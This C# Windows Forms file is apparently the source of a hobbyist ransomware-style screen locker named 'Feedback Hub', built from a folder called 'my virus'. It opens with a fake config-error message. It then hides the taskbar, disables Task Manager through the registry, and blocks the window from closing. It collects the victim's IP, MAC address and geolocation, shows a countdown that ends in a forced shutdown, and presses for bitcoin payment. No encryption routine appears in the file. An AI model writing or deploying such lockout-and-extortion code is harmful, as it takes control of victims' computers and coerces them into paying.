using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Feedback_Hub
{
    public partial class Form1 : Form
    {
        //privates
        private TimeSpan remainingTime;
        //to here

        [DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;

        public Form1()
        {
            InitializeComponent();

            this.ControlBox = false;

            int hwnd = FindWindow("Shell_TrayWnd", "");
            ShowWindow(hwnd, SW_HIDE);//hides task bar

            disable(); //disables task manager
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("Error in config file please press ok to fix...", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

            //music
            System.Media.SoundPlayer player = new System.Media.SoundPlayer();
            var username = System.Environment.GetEnvironmentVariable("USERNAME");
            player.SoundLocation = "C:\\Users\\" + username + "\\Desktop\\my virus\\Feedback Hub\\Feedback Hub\\bin\\Debug\\music\\chrishan - sin city ( slowed + reverb ).wav";
            player.Play();

            //starts countdown
            Countdown.Start();
            remainingTime = TimeSpan.FromMinutes(60);
            //gets ip
            IPHostEntry iph;
            string myip = "";
            iph = Dns.GetHostEntry(Dns.GetHostName());
            foreach(IPAddress ip in iph.AddressList)
            {
                if(ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    myip = ip.ToString();
                }
            }
            label7.Text = myip.ToString();

            //gets mac address
            string macAddress = string.Empty;
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddress = nic.GetPhysicalAddress().ToString();
                    break;
                }
            }

            // Set the text of the label to the MAC address
            label9.Text = "" + macAddress;

            WebClient wc = new WebClient();
            string geoip = wc.DownloadString("http://ip-api.com/json/");
            richTextBox2.Text = geoip;

        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Cancel any attempts to close the form
            e.Cancel = true;
            base.OnFormClosing(e);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Please do not try and close this form, all of your actions are infutile.","Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void Countdown_Tick(object sender, EventArgs e)
        {
            remainingTime = remainingTime.Subtract(TimeSpan.FromSeconds(1));

            // Update the label with the remaining time
            if (remainingTime.TotalSeconds > 0)
            {
                label3.Text = $" {remainingTime:mm\\:ss}";
            }
            else
            {
                label3.Text = "Goodbye :)";
                Countdown.Stop();
                Process.Start("shutdown", $"/s /t 3600");
            }
        }

        

        private void button2_Click(object sender, EventArgs e)
        {
            new Decrypt().Show();
            this.Hide();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Payment not yet recieved...","Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBox1.Text);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("To buy bitcoin, you can follow these general steps:\r\n\r\nChoose a cryptocurrency exchange: There are many cryptocurrency exchanges available, so you'll need to do some research to find one that fits your needs. Some popular options include Coinbase, Binance, and Kraken.\r\n\r\nCreate an account: Once you've chosen an exchange, you'll need to create an account. This typically involves providing your name, email address, and other personal information.\r\n\r\nVerify your identity: To comply with anti-money laundering regulations, most cryptocurrency exchanges require users to verify their identity. This may involve providing a copy of your government-issued ID, a selfie, and other documentation.\r\n\r\nAdd funds: Once your account is set up and verified, you'll need to add funds to it. Most exchanges allow you to fund your account with a bank transfer, credit card, or debit card.\r\n\r\nBuy bitcoin: With funds in your account, you can buy bitcoin by placing an order on the exchange. You'll typically need to choose the amount of bitcoin you want to buy and the price you're willing to pay.\r\n\r\nStore your bitcoin: Once you've bought bitcoin, you'll need to store it in a digital wallet. Some exchanges offer built-in wallets, while others require you to set up your own.\r\n\r\nIt's important to note that buying and selling bitcoin can be risky, as the price of bitcoin can be volatile and subject to rapid fluctuations. It's also important to take security precautions to protect your cryptocurrency, such as using strong passwords and two-factor authentication.");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("Bitcoin is a digital currency or cryptocurrency that was created in 2009 by an unknown person or group of people using the pseudonym Satoshi Nakamoto. It operates on a decentralized, peer-to-peer network that allows users to send and receive bitcoin without the need for intermediaries such as banks.\r\n\r\nBitcoin uses cryptography to secure transactions and control the creation of new units of the currency. Transactions are verified by network nodes through cryptography and recorded in a public distributed ledger called a blockchain.\r\n\r\nOne of the defining features of bitcoin is its limited supply. Only 21 million bitcoins will ever be created, which gives it some of the same scarcity properties as gold. As of 2022, around 18.8 million bitcoins have been mined.\r\n\r\nBitcoin's price has been known to be highly volatile, with sharp swings in value driven by a variety of factors including investor sentiment, media coverage, regulatory developments, and more.\r\n\r\nWhile bitcoin has been subject to criticism and regulatory scrutiny, many see it as a potential hedge against inflation, a store of value, and a potential alternative to traditional currencies and payment systems. Additionally, the underlying blockchain technology has been seen as having potential for various applications beyond currency.");
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("Creator: Quantum");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label10.Text = DateTime.Now.ToLongTimeString();
            label11.Text = DateTime.Now.ToLongDateString();
            label12.Text = DateTime.Now.ToLongDateString();
        }

        //close window overide
        protected override CreateParams CreateParams
        {
            get
            {
                const int CS_NOCLOSE = 0x200;

                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }

        //disables\enables task manager
        public void enable()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            objRegistryKey.DeleteValue("DisableTaskMgr");
            objRegistryKey.Close();
        }
        public void disable()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
                objRegistryKey.SetValue("DisableTaskMgr", "1");
        }

        private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            string MachineName1 = Environment.UserName;
            MessageBox.Show(System.Environment.UserName, null, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
